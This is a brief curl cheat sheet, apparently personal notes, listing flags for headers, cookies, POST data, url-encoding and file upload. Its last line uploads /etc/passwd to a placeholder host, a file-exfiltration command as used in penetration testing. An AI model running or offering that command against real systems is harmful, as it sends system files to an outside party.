# curl

```bash
curl [-X POST|PUT] [flags] URL [|html2text]

-I headers-only | -v verbose | -k insecure ssl  | -H header
-A user-agent
[-b | --cookie] cookie-string

# for POST data (not url-encoded)
#  will use Content-Type: application/x-www-form-urlencoded
-d "POST DATA"

# to url-encode
--data-urlencode

# binary data
--data-binary

# PUT file
-T <file>

curl -F 'data=@/etc/passwd' http://IP/kashz
```
